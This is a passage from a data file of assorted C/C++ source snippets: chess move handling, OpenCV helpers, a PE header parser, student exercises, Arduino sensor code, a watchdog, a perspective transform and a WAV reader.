 ep_sq[ply+1] = 0;                 //clear ep square\r\n  key_1 ^= rnd_epc[ep_sq[ply]];     //(set later if a 2 square advance)\r\n  g_ply[ply+1] = g_ply[ply] + 1;    //increment half move clock\r\n  man = mv_man(move);               //piece moving\r\n  b1 = mv_b1(move);                 //from\r\n  b2 = mv_b2(move);                 //to\r\n  cap = mv_cap(move);               //capture\r\n  //if this is a capture or pawn move reset the half move clock\r\n  if (cap || ((man & TYPE)==PAWN)) g_ply[ply+1] = 0;\r\n  //check for a king/rook move or a rook capture\r\n  if ((!(man & NO_CASTLE)) || ((cap & TYPE) == ROOK)) {\r\n    switch (man) {\r\n    case WK:\r\n      castle[ply+1] &= 12;\r\n      wk_sq = b2;\r\n      break;\r\n    case WR:\r\n      if (b1 == A1) castle[ply+1] &= 13;\r\n      else if (b1 == H1) castle[ply+1] &= 14;\r\n      break;\r\n    case BK:\r\n      castle[ply+1] &= 3;\r\n      bk_sq = b2;\r\n      break;\r\n    case BR:\r\n      if (b1 == A8) castle[ply+1] &= 7;\r\n      else if (b1 == H8) castle[ply+1] &= 11;\r\n      break;\r\n    }\r\n    switch (cap) {\r\n    case WR:\r\n      if (b2 == A1) castle[ply+1] &= 13;\r\n      else if (b2 == H1) castle[ply+1] &= 14;\r\n      break;\r\n    case BR:\r\n      if (b2 == A8) castle[ply+1] &= 7;\r\n      else if (b2 == H8) castle[ply+1] &= 11;\r\n      break;\r\n    }\r\n    key_1 ^= rnd_epc[castle[ply]];\r\n    key_1 ^= rnd",
    "#include \"impl.hpp\"\n\nint slow_and8u(const uchar* src1, size_t step1, const uchar* src2, size_t step2, uchar* dst, size_t step, int width, int height)\n{\n    for(; height--; src1 = src1 + step1, src2 = src2 + step2, dst = dst + step)\n        for(int x = 0 ; x < width; x++ )\n            dst[x] = src1[x] & src2[x];\n    return CV_HAL_ERROR_OK;\n}\n\nint slow_or8u(const uchar* src1, size_t step1, const uchar* src2, size_t step2, uchar* dst, size_t step, int width, int height)\n{\n    for(; height--; src1 = src1 + step1, src2 = src2 + step2, dst = dst + step)\n        for(int x = 0 ; x < width; x++ )\n            dst[x] = src1[x] | src2[x];\n    return CV_HAL_ERROR_OK;\n}\n\nint slow_xor8u(const uchar* src1, size_t step1, const uchar* src2, size_t step2, uchar* dst, size_t step, int width, int height)\n{\n    for(; height--; src1 = src1 + step1, src2 = src2 + step2, dst = dst + step)\n        for(int x = 0 ; x < width; x++ )\n            dst[x] = src1[x] ^ src2[x];\n    return CV_HAL_ERROR_OK;\n}\n\nint slow_not8u(const uchar* src1, size_t step1, uchar* dst, size_t step, int width, int height)\n{\n    for(; height--; src1 = src1 + step1, dst = dst + step)\n        for(int x = 0 ; x < width; x++ )\n            dst[x] = ~src1[x];\n    return CV_HAL_ERROR_OK;\n}\n",
    "#include \"portable_executable.hpp\"\r\n\r\nPIMAGE_NT_HEADERS64 portable_executable::GetNtHeaders(void* image_base)\r\n{\r\n\tconst auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(image_base);\r\n\r\n\tif (dos_header->e_magic != IMAGE_DOS_SIGNATURE)\r\n\t\treturn nullptr;\r\n\r\n\tconst auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uint64_t>(image_base) + dos_header->e_lfanew);\r\n\r\n\tif (nt_headers->Signature != IMAGE_NT_SIGNATURE)\r\n\t\treturn nullptr;\r\n\r\n\treturn nt_headers;\r\n}\r\n\r\nportable_executable::vec_relocs portable_executable::GetRelocs(void* image_base)\r\n{\r\n\tconst PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);\r\n\r\n\tif (!nt_headers)\r\n\t\treturn {};\r\n\r\n\tvec_relocs relocs;\r\n\tDWORD reloc_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;\r\n\r\n\tif (!reloc_va) //Fix from @greetmark of UnknownCheats Forum\r\n\t\treturn {};\r\n\r\n\tauto current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(image_base) + reloc_va);\r\n\tconst auto reloc_end = reinterpret_cast<uint64_t>(current_base_relocation) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;\r\n\r\n\twhile (current_base_relocation->VirtualAddress && current_base_relocation->VirtualAddress < reloc_end && current_base_relocation->SizeOfBlock)\r\n\t{\r\n\t\tRelocInfo reloc_info;\r\n\r\n\t\treloc_info.address = reinterpret_cast<uint64_t>(image_base) + current_base_relocation->VirtualAddress;\r\n\t\treloc_info.item = reinterpret_cast<uint16_t*>(reinterpret_cast<uint64_t>(current_base_relocation) + sizeof(IMAGE_BASE_RELOCATION));\r\n\t\treloc_info.count = (current_base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);\r\n\r\n\t\trelocs.push_back(reloc_info);\r\n\r\n\t\tcurrent_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(current_base_relocation) + current_base_relocation->SizeOfBlock);\r\n\t}\r\n\r\n\treturn relocs;\r\n}\r\n\r\nportable_executable::vec_imports portable_executable::GetImports(void* image_base)\r\n{\r\n\tconst PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);\r\n\r\n\tif (!nt_headers)\r\n\t\treturn {};\r\n\r\n\tvec_imports imports;\r\n\r\n\tauto current_import_descriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<uint64_t>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\r\n\r\n\twhile (current_import_descriptor->FirstThunk)\r\n\t{\r\n\t\tImportInfo import_info;\r\n\r\n\t\timport_info.module_name = std::string(reinterpret_cast<char*>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->Name));\r\n\r\n\t\tauto current_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->FirstThunk);\r\n\t\tauto current_originalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->OriginalFirstThunk);\r\n\r\n\t\twhile (current_originalFirstThunk->u1.Function)\r\n\t\t{\r\n\t\t\tImportFunctionInfo import_function_data;\r\n\r\n\t\t\tauto thunk_data = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<uint64_t>(image_base) + current_originalFirstThunk->u1.AddressOfData);\r\n\r\n\t\t\timport_function_data.name = thunk_data->Name;\r\n\t\t\timport_function_data.address = &current_first_thunk->u1.Function;\r\n\r\n\t\t\timport_info.function_datas.push_back(import_function_data);\r\n\r\n\t\t\t++current_originalFirstThunk;\r\n\t\t\t++current_first_thunk;\r\n\t\t}\r\n\r\n\t\timports.push_back(import_info);\r\n\t\t++current_import_descriptor;\r\n\t}\r\n\r\n\treturn imports;\r\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nvoid somando();\nint fibonacci(int n);\nint busca();\nstring inverte();\n\nint main() {\n\tsomando(); //Q01\n\tcout << endl;\n\tbusca(); //Q02\n\tcout << endl;\n\tinverte(); //Q05\n\n\treturn 0;\n}\n\n\n// Questao 01\nvoid somando() {\n\tint i = 13, k = 0, s = 0;\n\twhile (k < i) {\n\t\tk += 1;\n\t\ts += k;\n\t}\n\tcout << \"O resultado da soma e: \" << s << endl;\n}\n\n// Questao 02\nint fibonacci(int n) {\n\tif (n <= 1)\n\t\treturn n;\n\telse\n\t\treturn fibonacci(n - 1) + fibonacci(n - 2);\n}\n\nint busca() {\n\tvector<int> fib;\n\tint indice_encontrado = -1;\n\tint procurado;\n\n\tcout << \"Digite o numero a ser buscado: \";\n\tcin >> procurado;\n\n\tfor (int i = 0; i < 20; i++) {\n\t\tfib.push_back(fibonacci(i));\n\t\tif (fib[i] == procurado) {\n\t\t\tindice_encontrado = i;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (indice_encontrado != -1) {\n\t\tcout << \"Numero encontrado na sequencia na posicao \" << indice_encontrado << endl;\n\t}\n\telse {\n\t\tcout << \"Numero nao encontrado na sequencia\" << endl;\n\t}\n\n\treturn indice_encontrado;\n}\n\n// Questao 05\nstring inverte() {\n\tstring entrada, saida;\n\tcout << \"Insira a string que sera invertida: \";\n\tcin >> entrada;\n\tfor (int i = entrada.size(); i >= 0; i--) {\n\t\tsaida += entrada[i];\n\t}\n\tcout << \"A string invertida e: \" <<  saida << endl;\n\treturn saida;\n}\n",
    "#include \"node_1.h\"\n\n#include <iostream>\n\nnamespace tng_v1 {\n\nNode1::Node1() {\n    std::cout << \"Node1::Node1 ...\" << std::endl;\n    m_dataCenterOutput = m_outputDataCenter.get_future().share();\n}\n\nvoid Node1::run() {\n    std::cout << \"Node1::run ...\" << std::endl;\n\n    for (const auto& dci : m_dataCenterInput) {\n        if (dci.valid()) {\n            dci.wait();\n        }\n    }\n\n    if (m_dataCenterInput.size() > 0) {\n        std::shared_ptr<DataCenter> dataCenter = m_dataCenterInput[0].get();\n        std::shared_ptr<Node1InputData> inputData = dataCenter->node1InputData;\n        if (inputData) {\n            if (dataCenter->node1OutputData == nullptr) {\n                dataCenter->node1OutputData = std::shared_ptr<Node1OutputData>(new Node1OutputData);\n            }\n            dataCenter->node1OutputData->c += inputData->a + inputData->b;\n            std::cout << \"Node1 c: \" << dataCenter->node1OutputData->c\n                      << \" | a: \" << inputData->a\n                      << \" b: \" << inputData->b << std::endl;\n        }\n        \n        m_outputDataCenter.set_value(dataCenter);\n    }\n}\n\n}  // namespace tng_v1",
    "#include \"scene.h\"\n#include \"gzip.h\"\n#include <QDebug>\n#include <QFile>\n\nQByteArray SceneScript::save() const\n{\n\treturn _data;\n}\n\nSceneScriptOpcode SceneScript::opcodeAt(int pos, bool &ok) const\n{\n\tok = false;\n\n\tif (pos < _data.size()) {\n\t\tquint8 key = _data.at(pos++),\n\t\t\t\topInfos = opLength().value(key, 0),\n\t\t\t\tlength = SCENE_SCRIPT_LENGTH(opInfos);\n\t\tconst char *args = nullptr;\n\n\t\tif (length > 0) {\n\t\t\tif (pos + length <= _data.size()) {\n\t\t\t\targs = _data.constData() + pos;\n\t\t\t\tpos += length;\n\t\t\t\tok = true;\n\t\t\t}\n\t\t} else {\n\t\t\tok = true;\n\t\t}\n\n\t\tif (ok) {\n\t\t\tbool hasNull = SCENE_SCRIPT_LENGTH_HAS_NULL(opInfos),\n\t\t\t\t\thasFF = SCENE_SCRIPT_LENGTH_HAS_FF(opInfos);\n\t\t\tquint8 endChar = 0;\n\n\t\t\tif (hasFF) {\n\t\t\t\tendChar = 0xFF;\n\t\t\t}\n\n\t\t\tif (hasNull || hasFF) {\n\t\t\t\twhile (pos + length < _data.size() &&\n\t\t\t\t\t   quint8(_data.at(pos + length)) != endChar) {\n\t\t\t\t\tlength++;\n\t\t\t\t}\n\n\t\t\t\tif (hasFF) {\n\t\t\t\t\tlength++; // FF\n\t\t\t\t}\n\n\t\t\t\tif (length > 0) {\n\t\t\t\t\targs = _data.constData() + pos;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\treturn SceneScriptOpcode(key, args, length);\n\t}\n\treturn SceneScriptOpcode();\n}\n\nSceneScriptOpcode SceneScriptIterator::nextOpcode(int &pos)\n{\n\tbool ok;\n\tSceneScriptOpcode ret = _script.opcodeAt(_cur, ok);\n\tif (ok) {\n\t\tpos = _cur;\n\t\t_oldCur = _cur;\n\t\t_cur += ret.length + 1;\n\t} else {\n\t\tpos = -1;\n\t}\n\treturn ret;\n}\n\nSceneScriptOpcode SceneScriptIterator::nextOpcode(quint8 key, int &pos)\n{\n\tforever {\n\t\tSceneScriptOpcode op = nextOpcode(pos);\n\t\tif (pos < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (op.key == key) {\n\t\t\treturn op;\n\t\t}\n\t}\n\n\treturn SceneScriptOpcode();\n}\n\nQByteArray SceneScriptIterator::nextTextData(int &pos)\n{\n\tSceneScriptOpcode op = nextOpcode(0x93, pos);\n\tif (pos >= 0) {\n\t\treturn op.data();\n\t}\n\treturn QByteArray();\n}\n\n\nSceneScriptOpcode SceneScriptMutableIterator::nextOpcode(int &pos)\n{\n\tbool ok;\n\tSceneScriptOpcode ret = _script.opcodeAt(_cur, ok);\n\tif (ok) {\n\t\tpos = _cur;\n\t\t_oldCur = _cur;\n\t\t_cur += ret.length + 1;\n\t} else {\n\t\tpos = -1;\n\t}\n\treturn ret;\n}\n\nSceneScriptOpcode SceneScriptMutableIterator::nextOpcode(quint8 key, int &pos)\n{\n\tforever {\n\t\tSceneScriptOpcode op = nextOpcode(pos);\n\t\tif (pos < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (op.key == key) {\n\t\t\treturn op;\n\t\t}\n\t}\n\n\treturn SceneScriptOpcode();\n}\n\nQByteArray SceneScriptMutableIterator::nextTextData(int &pos)\n{\n\tSceneScriptOpcode op = nextOpcode(0x93, pos);\n\tif (pos >= 0) {\n\t\treturn op.data();\n\t}\n\treturn QByteArray();\n}\n\nvoid SceneScript::updateJumps(int from, int diff)\n{\n\tSceneScriptIterator it(*this);\n\n\tforever {\n\t\tint pos;\n\t\tSceneScriptOpcode ret = it.nextOpcode(pos);\n\t\tif (pos < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\t// Jumps\n\t\tif (ret.key == 0x70\n\t\t\t\t|| ret.key == 0x71\n\t\t\t\t|| ret.key == 0x72) {\n\t\t\tquint16 offset;\n\t\t\tmemcpy(&offset, ret.args, ret.length);\n\t\t\tif (offset > from) {\n\t\t\t\toffset += diff;\n\t\t\t}\n\t\t\t_data.replace(pos + 1, 2, (char *)&offset, 2);\n\t\t}\n\t}\n}\n\nint SceneScript::setTextData(int pos, const QByteArray &text)\n{\n\tbool ok;\n\tSceneScriptOpcode op = opcodeAt(pos, ok);\n\tif (ok && op.key == 0x93) {\n\t\tint size = op.length;\n\t\tif (!text.endsWith('\\xff')) {\n\t\t\tsize -= 1;\n\t\t}\n\t\t_data.replace(pos + 1, size, text);\n\t\tupdateJumps(pos, text.size() - size);\n\t\treturn size;\n\t} else {\n\t\tqWarning() << \"SceneScript::setText error\" << pos;\n\t\tQ_ASSERT(false);\n\t}\n\treturn -1;\n}\n\nvoid SceneScriptMutableIterator::setTextData(const QByteArray &text)\n{\n\tint size = _script.setTextData(_oldCur, text);\n\t// Change cursor pos if text size is different\n\tint diff = text.size() - size;\n\tif (diff != 0) {\n\t\t_cur += diff;\n\t}\n}\n\nQMap<quint8, quint8> SceneScript::_opLength;\n\nconst QMap<quint8, quint8> &SceneScript::opLength()\n{\n\tif (_opLength.isEmpty()) {\n\t\t_opLength[0x00] = 2;\n\t\t_opLength[0x01] = 2;\n\t\t_opLength[0x02] = 2;\n\t\t_opLength[0x03] = 2;\n\t\t_opLength[0x10] = 2;\n\t\t_opLength[0x11] = 2;\n\t\t_opLength[0x12] = 2;\n\t\t_opLength[0x13] = 2;\n\t\t_opLength[0x60] = 1;\n\t\t_opLength[0x61] = 2;\n\t\t_opLength[0x62] = 3;\n\t\t_opLength[0x70] = 2;\n\t\t_opLength[0x71] = 2;\n\t\t_opLength[0x72] = 2;\n\t\t_opLength[0x93] = SCENE_SCRIPT_LENGTH_FF(0);\n\t\t_opLength[0xA0] = SCENE_SCRIPT_LENGTH_NULL(1);\n\t}\n\n\treturn _opLength;\n}\n\nSceneFile::SceneFile()\n{\n}\n\nSceneFile::SceneFile(const QString &path)\n{\n\topen(path);\n}\n\nSceneFile::SceneFile(const QByteArray &data)\n{\n\topen(data);\n}\n\nbool SceneFile::open(const QString &path)\n{\n\tQFile f(path);\n\tif (!f.open(QIODevice::ReadOnly)) {\n\t\treturn false;\n\t}\n\n\treturn open(f.readAll());\n}\n\nbool SceneFile::open(const QByteArray &data, bool jp)\n{\n\t_data = data.left(0x1E80);\n\n\tconst quint8 nameLen = jp ? 16 : 32,\n\t\t\tennemySectionLen = 0x98 + nameLen;\n\n\t_ennemyNames[0] = data.mid(0x0298, nameLen);\n\t_ennemyNames[1] = data.mid(0x0298 + ennemySectionLen, nameLen);\n\t_ennemyNames[2] = data.mid(0x0298 + ennemySectionLen * 2, nameLen);\n\n\tint pos = 0x0298 + 0x03C0 + ennemySectionLen * 3;\n\n\tif (data.size() < pos + nameLen*32) {\n\t\tqWarning() << \"SceneFile::open too short\" << data.size();\n\t\treturn false;\n\t}\n\n\t_attackNames.clear();\n\n\tfor (int i=0 ; i<32 ; ++i) {\n\t\t_attackNames.append(data.mid(pos, nameLen));\n\t\tpos += nameLen;\n\t}\n\n\tpos += 0x0200;\n\n\tquint",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"Item.h\"\n\nItem::Item()\n{\n\t_name = \"default name\";\n\t_description = \"default description\";\n}\n\nItem::Item(std::string name, std::string description)\n{\n\t_name = name;\n\t_description = description;\n}\n\nstd::string Item::getName()\n{\n\treturn _name;\n}\n\nstd::string Item::getDescription()\n{\n\treturn _description;\n}\n\nstd::string Item::getAsciiArt()\n{\n\treturn std::string();\n}\n\nvoid Item::setName(std::string name)\n{\n\t_name = name;\n}\n\nvoid Item::setDescription(std::string description)\n{\n\t_description = description;\n}\n\n// Player Item\nPlayerItem::PlayerItem(const std::string& name, const std::string& description, bool heldByPlayer)\n{\n\tsetName(name);\n\tsetDescription(description);\n\t//setHeldByPlayer(heldByPlayer);\n}\n\nPlayerItem::PlayerItem(std::string name,  std::string description, bool heldByPlayer, std::map<std::string, Interaction*> linkedInteractions)\n{\n\tsetName(name);\n\tsetDescription(description);\n\t//_heldByPlayer = heldByPlayer;\n\tlinkedInteractions = linkedInteractions;\n}\n\n//bool PlayerItem::getHeldByPlayer()\n//{\n//\treturn _heldByPlayer;\n//}\n//\n//void PlayerItem::setHeldByPlayer(bool heldByPlayer)\n//{\n//\t_heldByPlayer = heldByPlayer;\n//}\n\n// Fixed Item\nFixedItem::FixedItem(std::string name, std::string description)\n{\n\tsetName(name);\n\tsetDescription(description);\n}\n\n\n",
    "#include <Arduino.h>\n#include <LedControl.h>\n#include <Adafruit_Sensor.h>\n\n#include \"hardware.hpp\"\n#include \"menu.hpp\"\n#include \"matrix-pattern.hpp\"\n\nconst int DIN = 6;\nconst int CS =  7;\nconst int CLK = 4;\n\nsensors_event_t a, g, temp;\nLedControl lc = LedControl(DIN, CLK, CS, 1);\nAdafruit_MPU6050 mpu;\n// MPU6050 imuData;\n\nvoid initHardware() {\n  pinMode(A3, INPUT);\n  pinMode(buzzerPin, OUTPUT);\n  digitalWrite(buzzerPin, LOW);\n  \n  lc.shutdown(0, false);\n  lc.setIntensity(0, 0);  // Set the brightness to lowest value\n  lc.clearDisplay(0);\n\n  ledPrintByte(smileyFace);\n\n  // TODO: Add initialization animation\n\n  if (!mpu.begin()) {\n    if (isDebug) Serial.println(\"Failed to find MPU6050 chip\");\n    while (1) {\n      delay(10);\n    }\n  }\n  \n  updateIMUData();\n\n  if (isDebug) Serial.println(\"Hardware initialized\");\n}\n\n\nvoid beep() {\n  if (isSilent) {\n    return;\n  }\n  digitalWrite(buzzerPin, HIGH);\n  delay(30);\n  digitalWrite(buzzerPin, LOW);\n}\n\nvoid doubleBeep() {\n  if (isSilent) {\n    return;\n  }\n  beep();\n  delay(40);\n  beep();\n}\n\nvoid longBeep() {\n  if (isSilent) {\n    return;\n  }\n  digitalWrite(buzzerPin, HIGH);\n  delay(200);\n  digitalWrite(buzzerPin, LOW);\n}\n\n\nvoid updateIMUData() {\n  mpu.getEvent(&a, &g, &temp);\n}\n\nvoid readIMUData() {\n  updateIMUData();\n\n  if (isDebug) Serial.println(\"====================================\");\n  if (isDebug) Serial.println(\"Temperature (*C): \" + String(temp.temperature));\n  if (isDebug) Serial.println(\"Acceleration (m/s^2) X: \" + String(a.acceleration.x) \n                  + \" Y: \" + String(a.acceleration.y) \n                  + \" Z: \" + String(a.acceleration.z));\n  if (isDebug) Serial.println(\"Rotation (rad/s) X: \" + String(g.gyro.x) \n                  + \" Y: \" + String(g.gyro.y) \n                  + \" Z: \" + String(g.gyro.z));\n  if (isDebug) Serial.println(\"====================================\");\n}\n\nuint_fast8_t checkTilt() {\n  updateIMUData();\n\n  if (a.acceleration.y > 5) {\n    // if (isDebug) Serial.println(\"Tilted to the right\");\n    return CMD_RIGHT;\n  } else if (a.acceleration.y < -5) {\n    // if (isDebug) Serial.println(\"Tilted to the left\");\n    return CMD_LEFT;\n  } else if (a.acceleration.z < -5) {\n    // if (isDebug) Serial.println(\"Tilted to the top\");\n    return CMD_UP;\n  } else if (a.acceleration.z > 5) {\n    // if (isDebug) Serial.println(\"Tilted to the bottom\");\n    return CMD_DOWN;\n  } else {\n    return 0;\n  }\n}\n\nuint_fast8_t checkRotation() {\n  updateIMUData();\n\n  if (g.gyro.z > 3) {\n    if (isDebug) Serial.println(\"Rotated right\");\n    return CMD_RIGHT;\n  } else if (g.gyro.z < -3) {\n    if (isDebug) Serial.println(\"Rotated left\");\n    return CMD_LEFT;\n  } else if (g.gyro.y > 3) {\n    if (isDebug) Serial.println(\"Rotated up\");\n    return CMD_UP;\n  } else if (g.gyro.y < -3) {\n    if (isDebug) Serial.println(\"Rotated down\");\n    return CMD_DOWN;\n  } else {\n    return 0;\n  }\n}\n\nboolean isShaking() {\n  updateIMUData();\n\n  // TODO: Tune the threshold\n  if (abs(a.acceleration.x) + abs(a.acceleration.y) + abs(a.acceleration.z) > 35) {\n    doubleBeep();\n    return true;\n  }\n  return false;\n}\n\nboolean isFacingDown() {\n  updateIMUData();\n\n  if (a.acceleration.x > 9) {\n    return true;\n  }\n  return false;\n}\n\n\nvoid ledPrintByte(const byte pattern[]) {\n  for (int i = 0; i < 8; i++) {\n    lc.setRow(0, i, pattern[i]);\n  }\n}\n\nvoid ledClear() {\n  lc.clearDisplay(0);\n}\n\nfloat getBatteryLevel() {\n  uint32_t Vbatt = 0;\n  for(int i = 0; i < 16; i++) {\n    Vbatt = Vbatt + analogReadMilliVolts(A3); // ADC with correction   \n  }\n  float Vbattf = 2 * Vbatt / 16 / 1000.0;     // attenuation ratio 1/2, mV --> V\n  if (isDebug) Serial.println(Vbattf, 3);\n\n  return Vbattf;\n}\n\nvoid showBatteryLevel() {\n  float Vbattf = getBatteryLevel();\n\n  // Compute ratio: 3.3-4.2V --> 0-100%\n  int battLevel = min(max(int((Vbattf - 3.3) / 0.9 * 100), 0), 100);\n  if (isDebug) Serial.println(\"Battery level: \" + String(battLevel) + \"%\");\n\n  // show on led matrix\n  ledPrintByte(numbers[battLevel]);\n  delay(750);\n  scrollingAnimation(numbers[battLevel], emptyLED, 0);\n  delay(250);\n}\n",
    "#include \"watchdog/watchdog.h\"\n\nnamespace watchdog {\n\nWatchdog::Watchdog() {\n  callback = [] {\n      std::cerr << \"watchdog triggered\\n\";\n      kill(getpid(), SIGTERM);\n  };\n  isRunning = false;\n}\n\nWatchdog::Watchdog(std::function<void()> _callback) {\n  callback = _callback;\n  isRunning = false;\n}\n\nWatchdog::~Watchdog() {\n  stop();\n}\n\nvoid Watchdog::start(unsigned int _interval) {\n    std::unique_lock<std::mutex> lock(mutex);\n    if(isRunning) return;\n\n    lastRefreshTime = std::chrono::steady_clock::now();\n    interval = _interval;\n    isRunning = true;\n    thread = std::thread(&Watchdog::loop, this);\n}\n\nvoid Watchdog::stop() {\n    std::unique_lock<std::mutex> lock(mutex);\n    if(!isRunning) return;\n\n    isRunning = false;\n    stopCondition.notify_all();\n    lock.unlock();\n    thread.join();\n}\n\nvoid Watchdog::refresh() {\n    std::unique_lock<std::mutex> lock(mutex);\n    lastRefreshTime = std::chrono::steady_clock::now();\n    stopCondition.notify_all();\n}\n\nvoid Watchdog::loop() {\n    std::unique_lock<std::mutex> lock(mutex);\n    while(isRunning) {\n      if(stopCondition.wait_for(lock, std::chrono::milliseconds(interval)) == std::cv_status::timeout) {\n        if(callback != nullptr) {\n          isRunning = false;\n          callback();\n        }\n      }\n    }\n}  \n\n}  \n",
    "#include \"Transformation.h\"\n\nTransformation::Transformation(int* pX, int* pY, int pScreenWidth, int pScreenHeight, int pPointX, int pPointY) {\n  x = pX;\n  y = pY;\n  screenWidth = pScreenWidth;\n  screenHeight = pScreenHeight;\n  pointX = pPointX;\n  pointY = pPointY;\n}\n\ndouble Transformation::x1(double varX, double varY) {\n  return varX - x[0];\n}\n\ndouble Transformation::x2(double varX, double varY) {\n  return x1(varX, varY);\n}\n\ndouble Transformation::x3(double varX, double varY) {\n  return x2(varX, varY) - y2(varX, varY) * x2(x[2], y[2]) / y2(x[2], y[2]);\n}\n\ndouble Transformation::x4(double varX, double varY) {\n  return (((x3(x[1], y[1]) / x3(x[3], y[3])) - 1) * (y3(varX, varY) / y3(x[3], y[3])) + 1) * x3(varX, varY);\n}\n\nint Transformation::u() {\n  return (int) (x4(pointX, pointY) * screenWidth / x4(x[3], y[3]));\n}\n\n\ndouble Transformation::y1(double varX, double varY) {\n  return varY - y[0];\n}\n\ndouble Transformation::y2(double varX, double varY) {\n  return y1(varX, varY) - x1(varX, varY) * y1(x[1], y[1]) / x1(x[1], y[1]);\n}\n\ndouble Transformation::y3(double varX, double varY) {\n  return y2(varX, varY);\n}\n\ndouble Transformation::y4(double varX, double varY) {\n  return (((y3(x[2], y[2]) / y3(x[3], y[3])) - 1) * (x3(varX, varY) / x3(x[3], y[3])) + 1) * y3(varX, varY);\n}\n\nint Transformation::v() {\n  return (int) (y4(pointX, pointY) * screenHeight / y4(x[3], y[3]));\n}\n",
    "#include \"wav_util.h\"\n\n#include <cstdint>\n#include <cstdio>\n#include <cstring>\n#include <fstream>\n#include <ios>\n#include <iostream>\n#include <ostream>\n#include <string>\n#include <vector>\n\n#define DR_WAV_IMPLEMENTATION\n#include \"dr_libs/dr_wav.h\"\n\nnamespace whisper {\n\nstd::vector<float> wav_read_legacy(const char* filename) {\n  // Open the WAV file for binary reading\n  std::ifstream wav_file(filename, std::ios::binary);\n\n  if (!wav_file.is_open()) {\n    std::cerr << \"Failed to open file: \" << filename << '\\n';\n    return std::vector<float>();\n  }\n\n  // Read the WAV header\n  WAVHeader wav_header;\n  wav_file.read(reinterpret_cast<char*>(&wav_header), sizeof(wav_header));\n\n  // Check if it's a valid WAV file\n  if (strncmp(wav_header.riff_header, \"RIFF\", 4) != 0 ||\n      strncmp(wav_header.wave_header, \"WAVE\", 4) != 0 ||\n      strncmp(wav_header.fmt_header, \"fmt \", 4) != 0) {\n    std::cerr << \"Not a valid WAV file: \" << filename << '\\n';\n    return std::vector<float>();\n  }\n\n  // Determine the audio format\n  std::string audio_format_str;\n  switch (wav_header.audio_format) {\n    case 1:\n      audio_format_str = \"PCM\";\n      break;\n    case 3:\n      audio_format_str = \"IEEE Float\";\n      break;\n    // Add more cases for other audio formats as needed\n    default:\n      audio_format_str = \"Unknown\";\n      break;\n  }\n\n  // Print information from the header\n  std::cout << \"Audio Format: \" << audio_format_str << '\\n';\n  std::cout << \"Num Channels: \" << wav_header.num_channels << '\\n';\n  std::cout << \"Sample Rate: \" << wav_header.sample_rate << '\\n';\n  std::cout << \"Bits Per Sample: \" << wav_header.bits_per_sample << '\\n';\n\n  // Calculate the number of samples\n  uint32_t num_samples = wav_header.wav_size / wav_header.block_align;\n\n  // convert pcm 16 to float\n  std::vector<float> float_samples(num_samples);\n  if (wav_header.audio_format == 1) {\n    // Read audio samples into a vector of int16_t\n    std::vector<int16_t> pcm16_samples(num_samples);\n    wav_file.read(reinterpret_cast<char*>(pcm16_samples.data()),\n                  wav_header.wav_size);\n\n    // Convert int16_t samples to float samples\n    for (uint32_t i = 0; i < num_samples; i++) {\n      float_samples[i] =\n          static_cast<float>(pcm16_samples[i]) / static_cast<float>(INT16_MAX);\n 